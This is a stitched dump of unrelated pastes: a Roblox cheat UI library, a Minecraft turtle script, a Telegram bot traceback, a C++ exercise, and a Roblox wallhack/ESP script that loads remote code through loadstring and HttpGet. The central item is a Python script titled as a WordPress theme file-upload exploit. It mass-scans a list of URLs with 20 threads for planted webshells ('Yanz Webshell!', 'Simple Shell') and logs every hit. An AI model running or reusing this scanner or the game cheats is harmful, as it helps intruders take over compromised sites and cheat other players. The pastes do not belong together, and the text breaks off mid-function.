				seperator.label = Instance.new(""TextLabel"", seperator.main)
				seperator.label.Name = ""Label""
				seperator.label.BackgroundTransparency = 1
				seperator.label.Size = seperator.main.Size
				seperator.label.Font = window.theme.font
				seperator.label.ZIndex = 8
				seperator.label.Text = seperator.text
				seperator.label.TextColor3 = Color3.fromRGB(255, 255, 255)
				seperator.label.TextSize = window.theme.fontsize
				seperator.label.TextStrokeTransparency = 1
				seperator.label.TextXAlignment = Enum.TextXAlignment.Center
				updateevent.Event:Connect(function(theme)
					seperator.label.Font = theme.font
					seperator.label.TextSize = theme.fontsize
				end)

				local textSize = textservice:GetTextSize(seperator.text, window.theme.fontsize, window.theme.font, Vector2.new(2000, 2000))
				local textStart = seperator.main.AbsoluteSize.X / 2 - (textSize.X / 2)

				sector.LabelBackFrame = Instance.new(""Frame"", seperator.main)
				sector.LabelBackFrame.Name = ""LabelBack""
				sector.LabelBackFrame.ZIndex = 7
				sector.LabelBackFrame.Size = UDim2.fromOffset(textSize.X + 12, 10)
				sector.LabelBackFrame.BorderSizePixel = 0
				sector.LabelBackFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
				sector.LabelBackFrame.Position = UDim2.new(0, textStart - 6, 0, 0)
				updateevent.Event:Connect(function(theme)
					textSize = textservice:GetTextSize(seperator.text, theme.fontsize, theme.font, Vector2.new(2000, 2000))
					textStart = seperator.main.AbsoluteSize.X / 2 - (textSize.X / 2)

					sector.LabelBackFrame.Size = UDim2.fromOffset(textSize.X + 12, 10)
					sector.LabelBackFrame.Position = UDim2.new(0, textStart - 6, 0, 0)
				end)

				sector:FixSize()

				return seperator
			end

			return sector
		end

		function tab:CreateConfigSystem(name, side)
			local configsystem = {}

			configsystem.configFolder = window.name .. "" / "" .. game[""PlaceId""]
			if (not isfolder(configsystem.configFolder)) then
				makefolder(configsystem.configFolder)
			end

			configsystem.sector = tab:CreateSector(name or ""Config System"", side or ""left"")

			local configname = configsystem.sector:AddTextbox(""Config Name"", """", configname, function() end, """")
			local default = (listfiles(configsystem.configFolder)[1] or """"):gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """")
			local config = configsystem.sector:AddDropdown(""Configs"", {}, default, false, function() end, """")
			for i, v in pairs(listfiles(configsystem.configFolder)) do
				if v:find("".txt"") then
					config:Add(v:gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """"))
				end
			end

			configsystem.Create = configsystem.sector:AddButton(""Create"", function()
				for i, v in pairs(listfiles(configsystem.configFolder)) do
					config:Remove(v:gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """"))
				end

				if configname:Get() and configname:Get() ~= """" then
					local config2 = {}

					for i, v in pairs(library.flags) do
						if (v and v ~= """") then
							if (typeof(v) == ""Color3"") then
								config2[i] = {v.R, v.G, v.B}
							elseif (v:find(""Enum.KeyCode"")) then
								config2[i] = v.Name
							elseif (typeof(v) == ""table"") then
								config2[i] = {v}
							else
								config2[i] = v
							end
						end
					end

					writefile(configsystem.configFolder .. "" / "" .. configname:Get() .. "".txt"", httpservice:JSONEncode(config2))

					for i, v in pairs(listfiles(configsystem.configFolder)) do
						if v:find("".txt"") then
							config:Add(v:gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """"))
						end
					end
				end
			end)

			configsystem.Save = configsystem.sector:AddButton(""Save"", function()
				local config = {}
				if config:Get() and config:Get() ~= """" then
					for i, v in pairs(library.flags) do
						if (v ~= nil and v ~= """") then
							if (typeof(v) == ""Color3"") then
								config[i] = {v.R, v.G, v.B}
							elseif (v:find(""Enum.KeyCode"")) then
								config[i] = ""Enum.KeyCode."" .. v.Name
							elseif (typeof(v) == ""table"") then
								config[i] = {v}
							else
								config[i] = v
							end
						end
					end

					writefile(configsystem.configFolder .. "" / "" .. config:Get() .. "".txt"", httpservice:JSONEncode(config))
				end
			end)

			configsystem.Load = configsystem.sector:AddButton(""Load"", function()
				local success = pcall(readfile, configsystem.configFolder .. "" / "" .. config:Get() .. "".txt"")
				if (success) then
					pcall(function()
						local readconfig = httpservice:JSONDecode(readfile(configsystem.configFolder .. "" / "" .. config:Get() .. "".txt""))
						local newconfig = {}

						for i, v in pairs(readconfig) do
							if (typeof(v) == ""table"") then
								if (typeof(v[1]) == ""number"") then
									newconfig[i] = Color3.new(v[1], v[2], v[3])
								elseif (typeof(v[1]) == ""table"") then
									newconfig[i] = v[1]
								end
							elseif (v:find(""Enum.KeyCode."")) then
								newconfig[i] = Enum.KeyCode[v:gsub(""Enum.KeyCode."", """")]
							else
								newconfig[i] = v
							end
						end

						library.flags = newconfig

						for i, v in pairs(library.flags) do
							for i2, v2 in pairs(library.items) do
								if (i ~= nil and i ~= """" and i ~= ""Configs_Name"" and i ~= ""Configs"" and v2.flag) then
									if (v2.flag == i) then
										pcall(function()
											v2:Set(v)
										end)
									end
								end
							end
						end
					end)
				end
			end)

			configsystem.Delete = configsystem.sector:AddButton(""Delete"", function()
				for i, v in pairs(listfiles(configsystem.configFolder)) do
					config:Remove(v:gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """"))
				end

				if (not config:Get() or config:Get() == """") then return end
				if (not isfile(configsystem.configFolder .. "" / "" .. config:Get() .. "".txt"")) then return end
				delfile(configsystem.configFolder .. "" / "" .. config:Get() .. "".txt"")

				for i, v in pairs(listfiles(configsystem.configFolder)) do
					if v:find("".txt"") then
						config:Add(v:gsub(configsystem.configFolder .. ""\\"", """"):gsub("".txt"", """"))
					end
				end
			end)

			return configsystem
		end

		table.insert(window.Tabs, tab)

		return tab
	end

	return window
end

function library:CreateWatermark(name, position)
	local gamename = game:GetService(""MarketplaceService""):GetProductInfo(game[""PlaceId""]).Name
	local watermark = {}
	watermark.Visible = true
	watermark.text = "" "" .. name:gsub(""{game}"", gamename):gsub(""{fps}"", ""0 FPS"") .. "" ""

	watermark.main = Instance.new(""ScreenGui"", coregui)
	watermark.main.Name = ""Watermark""

	if syn then
		syn.protect_gui(watermark.main)
	end

	watermark.mainbar = Instance.new(""Frame"", watermark.main)
	watermark.mainbar.Name = ""Main""
	watermark.mainbar.BorderColor3 = Color3.fromRGB(80, 80, 80)
	watermark.mainbar.Visible = watermark.Visible
	watermark.mainbar.BorderSizePixel = 0
	watermark.mainbar.ZIndex = 5
	watermark.mainbar.Position = UDim2.new(0, position and position.X or 10, 0, position and position.Y or 10)
	watermark.mainbar.Size = UDim2.new(0, 0, 0, 25)

	watermark.Gradient = Instance.new(""UIGradient"", watermark.mainbar)
	watermark.Gradient.Rotation = 90
	watermark.Gradient.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 10))})

	watermark.Outline = Instance.new(""Frame"", watermark.mainbar)
	watermark.Outline.Name = ""outline""
	watermark.Outline.ZIndex = 4
	watermark.Outline.BorderSizePixel = 0
	watermark.Outline.Visible = watermark.Visible
	watermark.Outline.BackgroundColor3 = library.theme.outlinecolor
	watermark.Outline.Position = UDim2.fromOffset(- 1, - 1)

	watermark.BlackOutline = Instance.new(""Frame"", watermark.mainbar)
	watermark.BlackOutline.Name = ""blackline""
	watermark.BlackOutline.ZIndex = 3
	watermark.BlackOutline.BorderSizePixel = 0
	watermark.BlackOutline.BackgroundColor3 = library.theme.outlinecolor2
	watermark.BlackOutline.Visible = watermark.Visible
	watermark.BlackOutline.Position = UDim2.fromOffset(- 2, - 2)

	watermark.label = Instance.new(""TextLabel"", watermark.mainbar)
	watermark.label.Name = ""FPSLabel""
	watermark.label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	watermark.label.BackgroundTransparency = 10
	watermark.label.Position = UDim2.new(0, 0, 0, 0)
	watermark.label.Size = UDim2.new(0, 238, 0, 25)
	watermark.label.Font = library.theme.font
	watermark.label.ZIndex = 6
	watermark.label.Visible = watermark.Visible
	watermark.label.Text = watermark.text
	watermark.label.TextColor3 = Color3.fromRGB(255, 255, 255)
	watermark.label.TextSize = 15
	watermark.label.TextStrokeTransparency = 0
	watermark.label.TextXAlignment = Enum.TextXAlignment.Left
	watermark.label.Size = UDim2.new(0, watermark.label.TextBounds.X + 10, 0, 25)

	watermark.topbar = Instance.new(""Frame"", watermark.mainbar)
	watermark.topbar.Name = ""TopBar""
	watermark.topbar.ZIndex = 6
	watermark.topbar.BackgroundColor3 = library.theme.accentcolor
	watermark.topbar.BorderSizePixel = 0
	watermark.topbar.Visible = watermark.Visible
	watermark.topbar.Size = UDim2.new(0, 0, 0, 1)

	watermark.mainbar.Size = UDim2.new(0, watermark.label.TextBounds.X, 0, 25)
	watermark.topbar.Size = UDim2.new(0, watermark.label.TextBounds.X + 6, 0, 1)
	watermark.Outline.Size = watermark.mainbar.Size + UDim2.fromOffset(2, 2)
	watermark.BlackOutline.Size = watermark.mainbar.Size + UDim2.fromOffset(4, 4)

	watermark.mainbar.Size = UDim2.new(0, watermark.label.TextBounds.X + 4, 0, 25)
	watermark.label.Size = UDim2.new(0, watermark.label.TextBounds.X + 4, 0, 25)
	watermark.topbar.Size = UDim2.new(0, watermark.label.TextBounds.X + 6, 0, 1)
	watermark.Outline.Size = watermark.mainbar.Size + UDim2.fromOffset(2, 2)
	watermark.BlackOutline.Size = watermark.mainbar.Size + UDim2.fromOffset(4, 4)

	local starttime, counter, oldfps = os.clock(), 0, nil
	runservice.Heartbeat:Connect(function()
		watermark.label.Visible = watermark.Visible
		watermark.mainbar.Visible = watermark.Visible
		watermark.topbar.Visible = watermark.Visible
		watermark.Outline.Visible = watermark.Visible
		watermark.BlackOutline.Visible = watermark.Visible

		if not name:find(""{fps}"") then
			watermark.label.Text = "" "" .. name:gsub(""{game}"", gamename):gsub(""{fps}"", ""0 FPS"") .. "" ""
		end

		if name:find(""{fps}"") then
			local currenttime = os.clock()
			counter = counter + 1
			if currenttime - starttime >= 1 then
				local fps = math.round(counter / (currenttime - starttime))
				counter = 0
				starttime = currenttime

				if fps ~= oldfps then
					watermark.label.Text = "" "" .. name:gsub(""{game}"", gamename):gsub(""{fps}"", fps .. "" FPS"") .. "" ""

					watermark.label.Size = UDim2.new(0, watermark.label.TextBounds.X + 10, 0, 25)
					watermark.mainbar.Size = UDim2.new(0, watermark.label.TextBounds.X, 0, 25)
					watermark.topbar.Size = UDim2.new(0, watermark.label.TextBounds.X, 0, 1)

					watermark.Outline.Size = watermark.mainbar.Size + UDim2.fromOffset(2, 2)
					watermark.BlackOutline.Size = watermark.mainbar.Size + UDim2.fromOffset(4, 4)
				end
				oldfps = fps
			end
		end
	end)

	watermark.mainbar.MouseEnter:Connect(function()
		tweenservice:Create(watermark.mainbar, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 1, Active = false}):Play()
		tweenservice:Create(watermark.topbar, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 1, Active = false}):Play()
		tweenservice:Create(watermark.label, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {TextTransparency = 1, Active = false}):Play()
		tweenservice:Create(watermark.Outline, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 1, Active = false}):Play()
		tweenservice:Create(watermark.BlackOutline, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 1, Active = false}):Play()
	end)

	watermark.mainbar.MouseLeave:Connect(function()
		tweenservice:Create(watermark.mainbar, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 0, Active = true}):Play()
		tweenservice:Create(watermark.topbar, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 0, Active = true}):Play()
		tweenservice:Create(watermark.label, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {TextTransparency = 0, Active = true}):Play()
		tweenservice:Create(watermark.Outline, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 0, Active = true}):Play()
		tweenservice:Create(watermark.BlackOutline, TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In), {BackgroundTransparency = 0, Active = true}):Play()
	end)

	function watermark:UpdateTheme(theme)
		theme = theme or library.theme
		watermark.Outline.BackgroundColor3 = theme.outlinecolor
		watermark.BlackOutline.BackgroundColor3 = theme.outlinecolor2
		watermark.label.Font = theme.font
		watermark.topbar.BackgroundColor3 = theme.accentcolor
	end

	return watermark
end

function library:CheckErrors(error1, error2, eplayer, v1, v2)
	local message = ""Unexpected client behavior.""
	local echeck1, client = function(err1)
		if err1 then
			local errorcheck1 = {
				error57 = err1
			}

			if not errorcheck1.error57 then
				local printval = function(val)
					print(val)
				end

				printval(message)
			end

			return err1
		end

		return """"
	end, eplayer

	if error1 and error2 then
		local errtable, pcheck1 = {
			err_1 = error1, 
			err_2 = error2
		}, function(detected, reason)
			detected:Kick(reason)
		end

		if not (errtable.err_1 and errtable.err_2) then
			if client then
				pcheck1(client, message)
			end
		end

		if (errtable.err_1 == error1) and (errtable.err_2 == error2) then
			if v1 ~= v2 then
				pcheck1(client, message)
			end
		end
	end
end

return library"
ehgT7R8E,concrete.lua,opencomputerstest2,Lua,Thursday 11th of April 2024 06:47:06 AM CDT,"local input = peripheral.wrap(""sc-goodies:gold_barrel_2296"")
local output = peripheral.wrap(""sc-goodies:iron_barrel_2249"")
local myName = peripheral.find(""modem"").getNameLocal()
turtle.select(1)

while true do
	for i=1,input.size() do
		print(""Slot: "" .. i)
		local data = input.getItemDetail(i)
		if data and data.name:match(""concrete_powder"") then
			input.pushItems(myName, i, 1)
			turtle.place()
			turtle.dig()
			output.pullItems(myName, 1)
		end
	end
end"
yeFS18LR,x,x2w,GetText,Thursday 11th of April 2024 06:43:29 AM CDT,"x


















x"
ZrX3qAMC,Wordpress Theme Travelscape v1.0.3 - Arbitrary File Upload,FlyFar,Python,Thursday 11th of April 2024 06:20:41 AM CDT,"# Exploit Title: Wordpress Theme Travelscape v1.0.3 - Arbitrary File Upload
# Date: 2024-04-01
# Author: Milad Karimi (Ex3ptionaL)
# Category : webapps
# Tested on: windows 10 , firefox

import sys
import os.path
import requests
import re
import urllib3
from requests.exceptions import SSLError
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore, init
init(autoreset=True)
error_color = Fore.RED
info_color = Fore.CYAN
success_color = Fore.GREEN
highlight_color = Fore.MAGENTA
requests.urllib3.disable_warnings()
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M;
wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107
Mobile Safari/537.36',
    'Accept':
'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',

    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}
def URLdomain(url):
    if url.startswith(""http://""):
        url = url.replace(""http://"", """")
    elif url.startswith(""https://""):
        url = url.replace(""https://"", """")
    if '/' in url:
        url = url.split('/')[0]
    return url
def check_security(url):
    fg = success_color
    fr = error_color
    try:
        url = 'http://' + URLdomain(url)
        check = requests.get(url +
'/wp-content/themes/travelscape/json.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'MSQ_403' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('MSQ_403.txt', 'a').write(url +
'/wp-content/themes/travelscape/json.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url +
'/wp-content/themes/aahana/json.php', headers=headers,
allow_redirects=True, verify=False, timeout=15)
            if 'MSQ_403' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('MSQ_403.txt', 'a').write(url +
'/wp-content/themes/aahana/json.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
        check = requests.get(url + '/wp-content/themes/travel/issue.php',
headers=headers, allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url +
'/wp-content/themes/travel/issue.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/about.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'Yanz Webshell!' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/about.php\n')
        else:
            url = 'https://' + URLdomain(url)
        check = requests.get(url +
'/wp-content/themes/digital-download/new.php', headers=headers,
allow_redirects=True, timeout=15)
        if '#0x2525' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('digital-download.txt', 'a').write(url +
'/wp-content/themes/digital-download/new.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'http://' + URLdomain(url)
        check = requests.get(url + '/epinyins.php', headers=headers,
allow_redirects=True, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/epinyins.php\n')
        else:
            print(' -| ' + url + ' --> {}[Failed]'.format(fr))
            url = 'https://' + URLdomain(url)
        check = requests.get(url + '/wp-admin/dropdown.php',
headers=headers, allow_redirects=True, verify=False, timeout=15)
        if 'Uname:' in check.text:
            print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
            open('wso.txt', 'a').write(url + '/wp-admin/dropdown.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url +
'/wp-content/plugins/dummyyummy/wp-signup.php', headers=headers,
allow_redirects=True, verify=False, timeout=15)
            if 'Simple Shell' in check.text:
                print(' -| ' + url + ' --> {}[Successfully]'.format(fg))
                open('dummyyummy.txt', 'a').write(url +
'/wp-content/plugins/dummyyummy/wp-signup.php\n')
            else:
                print(' -| ' + url + ' --> {}[Failed]'.format(fr))
    except Exception as e:
        print(f' -| {url} --> {fr}[Failed] due to: {e}')
def main():
    try:
        url_file_path = sys.argv[1]
    except IndexError:
        url_file_path = input(f""{info_color}Enter the path to the file
containing URLs: "")
        if not os.path.isfile(url_file_path):
            print(f""{error_color}[ERROR] The specified file path is
invalid."")
            sys.exit(1)
    try:
        urls_to_check = [line.strip() for line in open(url_file_path, 'r',
encoding='utf-8').readlines()]
    except Exception as e:
        print(f""{error_color}[ERROR] An error occurred while reading the
file: {e}"")
        sys.exit(1)
    pool = ThreadPool(20)
    pool.map(check_security, urls_to_check)
    pool.close()
    pool.join()
    print(f""{info_color}Security check process completed successfully.
Results are saved in corresponding files."")
if __name__ == ""__main__"":
    main()
            "
dUf5bmCS,Untitled,renanv,Bash,Thursday 11th of April 2024 06:16:33 AM CDT,"Traceback (most recent call last):
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 309, in _process_update
    response = await self.feed_update(bot, update, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 158, in feed_update
    response = await self.update.wrap_outer_middleware(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/middlewares/error.py"", line 25, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/middlewares/user_context.py"", line 27, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/fsm/middleware.py"", line 41, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 77, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/telegram.py"", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File ""/home/videofactorybot/middlewares/db.py"", line 24, in __call__
    result = await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/handler.py"", line 43, in call
    return await wrapped()
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/dispatcher.py"", line 276, in _listen_update
    return await self.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/context/intent_middleware.py"", line 186, in process_callback_query
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 77, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 156, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 156, in _propagate_event
    response = await router.propagate_event(update_type=update_type, event=event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 128, in propagate_event
    return await observer.wrap_outer_middleware(_wrapped, event=event, data=kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 123, in _wrapped
    return await self._propagate_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/router.py"", line 148, in _propagate_event
    response = await observer.trigger(event, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/telegram.py"", line 121, in trigger
    return await wrapped_inner(event, kwargs)
  File ""/home/videofactorybot/middlewares/check_user.py"", line 34, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/manager/manager_middleware.py"", line 52, in __call__
    return await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/context/intent_middleware.py"", line 198, in context_saver_middleware
    result = await handler(event, data)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram/dispatcher/event/handler.py"", line 43, in call
    return await wrapped()
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/dialog.py"", line 145, in _callback_handler
    await window.process_callback(cleaned_callback, self, dialog_manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/window.py"", line 100, in process_callback
    await self.keyboard.process_callback(callback, dialog, manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/base.py"", line 79, in process_callback
    return await self._process_other_callback(callback, dialog, manager)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/group.py"", line 74, in _process_other_callback
    if await b.process_callback(callback, dialog, manager):
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/base.py"", line 73, in process_callback
    return await self._process_item_callback(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/select.py"", line 119, in _process_item_callback
    await self.on_click.process_event(
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/widget_event.py"", line 34, in process_event
    await self.callback(event, source, manager, *args, **kwargs)
  File ""/home/videofactorybot/venv/lib/python3.9/site-packages/aiogram_dialog/widgets/kbd/select.py"", line 182, in _process_click
    callback, select, manager, self.type_factory(item_id),
  File ""/home/videofactorybot/dialogs/admin/access/windows.py"", line 64, in <lambda>
    type_factory=lambda x: RoleEnum[x],
  File ""/usr/lib/python3.9/enum.py"", line 408, in __getitem__
    return cls._member_map_[name]
KeyError: <RoleEnum.UNKNOWN: 'Неизвестный'>"
NDyaMdaJ,Untitled,35657,C++,Thursday 11th of April 2024 06:16:17 AM CDT,"#include <iostream>

using namespace std;

int find_min_sum_position(int* arr, const int size, int start = 0, int min_sum = INT_MAX, int min_sum_position = 0) {
	if (start > size - 10) {
		return min_sum_position;
	}
	int current_sum = 0;
	for (int i = start; i < start + 10; i++) {
		current_sum += arr[i];
	}
	if (current_sum < min_sum) {
		min_sum = current_sum;
		min_sum_position = start;
	}
	return find_min_sum_position(arr, size, start + 1, min_sum, min_sum_position);
}


int main() {
	setlocale(LC_ALL, ""ru"");

	srand(time(NULL));

	const int size = 100;
	int arr[size];

	for (int i = 0; i < size; i++) {
		arr[i] = rand() % 10;
		cout << arr[i] << "" "";
	}
	cout << endl;

	cout << find_min_sum_position(arr, size) << endl;
}
"
e0pecmKW,sese,hacimiks,Lua,Thursday 11th of April 2024 06:08:39 AM CDT,"--// Preventing Multiple Processes

pcall(function()
    getgenv().WallHack.Functions:Exit()
end)

--// Environment

getgenv().WallHack = {}
local Environment = getgenv().WallHack

--// Services

local StarterGui = game:GetService(""StarterGui"")
local RunService = game:GetService(""RunService"")
local HttpService = game:GetService(""HttpService"")
local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")
local Camera = game:GetService(""Workspace"").CurrentCamera

--// Variables

local LocalPlayer = Players.LocalPlayer
local Title = ""RemiAPE | by aoki0x""
local FileNames = {""Wall Hack"", ""Configuration.json"", ""Visuals.json"", ""Crosshair.json""}
local ServiceConnections = {}

--// Cached Functions

local tonumber, tostring, next, pcall, type, loadstring = tonumber, tostring, next, pcall, type, loadstring
local Color3fromRGB, Vector2new, Vector3new, Drawingnew = Color3.fromRGB, Vector2.new, Vector3.new, Drawing.new
local stringmatch = string.match
local mathfloor = math.floor
local coroutinewrap = coroutine.wrap

--// Script Settings

Environment.WrappedPlayers = {}

loadstring(game:HttpGet(""https://raw.githubusercontent.com/aoki0x/Wall-Hack/main/Resources/Scripts/Manual%20Factory%20Reset%20Settings.lua""))()

Environment.Crosshair.Parts = {
    LeftLine = Drawingnew(""Line""),
    RightLine = Drawingnew(""Line""),
    TopLine = Drawingnew(""Line""),
    BottomLine = Drawingnew(""Line""),
    CenterDot = Drawingnew(""Circle"")
}

--// Core Functions

local function Encode(Table)
    if Table and type(Table) == ""table"" then
        local EncodedTable = HttpService:JSONEncode(Table)

        return EncodedTable
    end
end

local function Decode(String)
    if String and type(String) == ""string"" then
        local DecodedTable = HttpService:JSONDecode(String)

        return DecodedTable
    end
end

local function SendNotification(TitleArg, DescriptionArg, DurationArg)
    if Environment.Settings.SendNotifications then
        StarterGui:SetCore(""SendNotification"", {
            Title = TitleArg,
            Text = DescriptionArg,
            Duration = DurationArg
        })
    end
end

local function GetColor(Color)
    local R = tonumber(stringmatch(Color, ""([%d]+)[%s]*,[%s]*[%d]+[%s]*,[%s]*[%d]+""))
    local G = tonumber(stringmatch(Color, ""[%d]+[%s]*,[%s]*([%d]+)[%s]*,[%s]*[%d]+""))
    local B = tonumber(stringmatch(Color, ""[%d]+[%s]*,[%s]*[%d]+[%s]*,[%s]*([%d]+)""))

    return Color3fromRGB(R, G, B)
end

local function GetPlayerTable(Player)
    for _, v in next, Environment.WrappedPlayers do
        if v.Name == Player.Name then
            return v
        end
    end
end

--// Visuals

local function AddESP(Player)
    local PlayerTable = GetPlayerTable(Player)

    PlayerTable.ESP = Drawingnew(""Text"")

    PlayerTable.Connections.ESP = RunService.RenderStepped:Connect(function()
        if Player.Character and Player.Character:FindFirstChild(""Humanoid"") and Player.Character:FindFirstChild(""Head"") and Player.Character:FindFirstChild(""HumanoidRootPart"") and Environment.Settings.Enabled then
            local Vector, OnScreen = Camera:WorldToViewportPoint(Player.Character.Head.Position)

            PlayerTable.ESP.Visible = Environment.Visuals.ESPSettings.Enabled

            local function UpdateESP()
                PlayerTable.ESP.Size = Environment.Visuals.ESPSettings.TextSize
                PlayerTable.ESP.Center = Environment.Visuals.ESPSettings.Center
                PlayerTable.ESP.Outline = Environment.Visuals.ESPSettings.Outline
                PlayerTable.ESP.OutlineColor = GetColor(Environment.Visuals.ESPSettings.OutlineColor)
                PlayerTable.ESP.Color = GetColor(Environment.Visuals.ESPSettings.TextColor)
                PlayerTable.ESP.Transparency = Environment.Visuals.ESPSettings.TextTransparency
                PlayerTable.ESP.Font = Environment.Visuals.ESPSettings.TextFont

                PlayerTable.ESP.Position = Vector2new(Vector.X, Vector.Y - 25)

                local Parts = {
                    Health = ""(""..tostring(Player.Character.Humanoid.Health).."")"",
                    Distance = ""[""..tostring(mathfloor((Player.Character.HumanoidRootPart.Position - (LocalPlayer.Character.HumanoidRootPart.Position or Vector3new(0, 0, 0))).Magnitude))..""]"",
                    Name = Player.Name
                }

                local Content = """"

                if Environment.Visuals.ESPSettings.DisplayName then
                    Content = Parts.Name..Content
                end

                if Environment.Visuals.ESPSettings.DisplayHealth then
                    if Environment.Visuals.ESPSettings.DisplayName then
                        Content = Parts.Health.."" ""..Content
                    else
                        Content = Parts.Health..Content
                    end
                end

                if Environment.Visuals.ESPSettings.DisplayDistance then
                    Content = Content.."" ""..Parts.Distance
                end

                PlayerTable.ESP.Text = Content
            end

            if OnScreen then
                if Environment.Visuals.ESPSettings.Enabled then
                    local Checks = {Alive = true, Team = true}

